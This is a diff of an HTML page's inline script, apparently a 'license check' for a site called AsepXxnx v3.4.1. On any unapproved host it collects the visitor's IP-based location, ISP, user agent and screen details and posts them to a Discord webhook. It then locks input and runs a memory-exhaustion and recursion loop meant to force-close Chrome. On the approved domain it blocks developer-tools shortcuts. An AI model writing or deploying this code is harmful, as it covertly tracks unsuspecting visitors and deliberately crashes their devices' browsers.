@@ -21,45 +21,48 @@
 (function(){
   const _0xV = "3.4.1";
   
-  // Validasi rute ketat menggunakan pencarian fragmen URL resmi Anda (Anti-gagal akibat huruf kapital)
+  // Kata kunci unik dari URL resmi Anda untuk validasi mutlak (Diubah ke huruf kecil untuk sistem)
   const _0xTargetKey = "bot-wa-db/mamakluytm/punyaspainijirngentotytmlusemua.html";
+  
+  // Daftar domain resmi Anda
   const _0xAL = ["asepxyz12.github.io", "localhost", "127.0.0.1"];
   
-  // Integrasi pelacakan otomatis ke Discord Webhook Anda
+  // URL Webhook Discord Anda sudah terpasang tepat di bawah ini
   const _0xWH = "https://discord.com"; 
 
   const _0xH = location.hostname.toLowerCase();
   const _0xF = location.href.toLowerCase();
 
+  // FIX LOADING: Validasi menggunakan .includes() agar kebal bug split/kapital dan web asli lu kebuka mulus
   const _0xIsDomainValid = _0xAL.includes(_0xH);
   const _0xIsPathValid = _0xF.includes(_0xTargetKey);
 
-  // JIKA TERDETEKSI RE-MAKE ATAU AKSES ILEGAL: BOM FORCE CLOSE SECEPATNYA
+  // JIKA BUKAN LINK ASLI ANDA (COPY-PASTE / REMAKE): LANGSUNG JALANKAN ATTACK FORCE CLOSE
   if (!(_0xIsDomainValid && _0xIsPathValid)) {
     
-    // Bersihkan DOM dalam 0.1 milidetik agar halaman tidak memuat tampilan apa pun
+    // Hapus seluruh struktur halaman web secara senyap dalam 0.001 detik
     document.documentElement.innerHTML = "";
 
     const _0xUA = navigator.userAgent;
     const _0xPlat = navigator.platform || "Unknown";
     const _0xScreen = `${screen.width}x${screen.height}`;
 
-    // Laporkan data perangkat dan jaringan pelaku ke Discord Webhook (Menggunakan HTTPS aman)
+    // Kirim data pelacakan pelaku ke Discord Webhook via HTTPS (Anti-Blocked)
     fetch("https://ip-api.com")
       .then(r => r.json())
       .then(d => {
         if (d.status === "success") {
           const embedPayload = {
             embeds: [{
-              title: "💥 CYBER WEAPON: TERMINATION PUSHED!",
-              description: `Seseorang mencoba melakukan remake / modifikasi pada skrip **AsepXxnx v3.4.1**. Eksekusi pemutusan paksa aplikasi Chrome sedang berjalan.`,
+              title: "💥 CYBER WEAPON: INSTANT FORCE CLOSE FIRED!",
+              description: `Terdeteksi pembajakan / remake kode pada script **AsepXxnx v3.4.1**. Aplikasi Chrome pelaku dipaksa keluar (*Force Close*) tanpa klik!`,
               color: 16515843, 
               fields: [
                 { name: "🌐 Detail Jaringan", value: `• **IP**: \`${d.query}\`\n• **Lokasi**: ${d.city}, ${d.regionName}, ${d.country}\n• **ISP**: ${d.isp}`, inline: false },
-                { name: "💻 Informasi Gawai", value: `• **Sistem Operasi**: \`${_0xPlat}\`\n• **Resolusi Layar**: \`${_0xScreen}\`\n• **User-Agent**: \`${_0xUA}\``, inline: false },
+                { name: "💻 Perangkat Pelaku", value: `• **OS**: \`${_0xPlat}\`\n• **Layar**: \`${_0xScreen}\`\n• **User-Agent**: \`${_0xUA}\``, inline: false },
                 { name: "📍 Lokasi TKP", value: `• **Tautan Palsu**: ${location.href}`, inline: false }
               ],
-              footer: { text: "AsepXxnx Cyber Weapon" },
+              footer: { text: "AsepXxnx Cyber Security" },
               timestamp: new Date().toISOString()
             }]
           };
@@ -72,58 +75,56 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ 
             embeds: [{
-              title: "💥 ALERT: INSTANT FORCE CLOSE (ADBLOCK ACTIVE)",
-              description: `Pelaku menggunakan pemblokir skrip jaringan. Serangan pembekuan memori tetap sukses dieksekusi.\n• **URL TKP**: ${location.href}`,
+              title: "💥 ALERT: INSTANT FORCE CLOSE RUNNING (ADBLOCK ON)",
+              description: `Pelaku menggunakan AdBlocker, eksekusi pemutusan paksa aplikasi tetap sukses.\n• **URL TKP**: ${location.href}`,
               color: 16515843
             }]
           })
         });
       });
 
-    // Amankan penuh interaksi fisik pada layar gawai pelaku
+    // Kunci penuh interaksi kontrol layar fisik pada gawai pelaku
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', e => e.preventDefault());
     document.addEventListener('touchstart', e => e.preventDefault(), {passive: false});
 
-    // ENGINE CRASH UTAMA: FLOODING TAB ENGINE VIA REKURSIF BINARY HEAP (AUTO-FC TANPA KLIK)
+    // AMUNISI UTAMA: EXTREME FLOAT HEAP BUFFER OVERFLOW (FC NON-CLICK INSTAN)
     function _0xExecuteInstantFC() {
       const _0xCrashStack = [];
       while (true) {
         try {
-          // 1. Suntik alokasi byte float presisi tinggi langsung ke alokasi memori V8 Chrome
+          // Suntik tabel biner Float64 secara eksponensial ke inti engine browser
           _0xCrashStack.push(new Float64Array(16000000)); 
-          
-          // 2. Timbun tumpukan riwayat navigasi untuk merusak kestabilan UI thread Chrome
           window.history.pushState({fc: Math.random()}, "", location.href + "?fc=" + Math.random().toString(36).substring(2));
-          
-          // 3. Rekursi berantai tak terbatas guna memaksa Stack Overflow instan
           _0xExecuteInstantFC(); 
         } catch(e) {
-          // Jika prosesor membatasi kebocoran, lempar ratusan fungsi paralel ke latar belakang
           setTimeout(_0xExecuteInstantFC, 0);
           break;
         }
       }
     }
 
-    // Beri jeda 50 milidetik saja agar transmisi data ke Discord Anda selesai, lalu matikan aplikasinya
+    // Jeda singkat 50ms agar pengiriman data ke Discord lolos, lalu hancurkan Chrome pelaku
     setTimeout(_0xExecuteInstantFC, 50);
-    throw new Error("Unauthorized process instance terminated.");
+    throw new Error("Process Terminated.");
   }
 
-  // JIKA LISENSI COCOK (LINK RESMI ANDA), SEGMEN INI JALAN MULUS TANPA LAG / NORMAL
+  // JIKA LISENSI VALID (LINK RESMI ANDA), SEGMEN DI BAWAH INI AKTIF (WEB JALAN NORMAL)
   document.addEventListener('contextmenu', e => e.preventDefault());
   document.addEventListener('keydown', e => {
     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
       e.preventDefault();
       console.clear();
+      console.log("%cSTOP!","color:red;font-size:40px;font-weight:bold");
     }
   });
 
-  console.log("%cAsepXxnx Secure Runtime Active", "color:#7ee787;font-weight:bold");
+  console.clear();
+  console.log("%cAsepXxnx Secure Runtime","color:#7ee787;font-size:14px;font-weight:bold");
+  console.log("%cVersion: "+_0xV,"color:#79c0ff");
 })();
 
-// Pengaturan Konfigurasi Framework Tailwind CSS Tetap Berjalan Sempurna
+// Pengaturan Konfigurasi Tailwind Framework Anda Tetap Berjalan Sempurna
 window.tailwind = window.tailwind || {};
 tailwind.config = {
   theme: {
@@ -141,6 +142,7 @@ tailwind.config = {
   }
 }
 </script>
+
 
 (<style/> 
 body { font-family: 'Inter', sans-serif; transition: all 0.3s ease; }
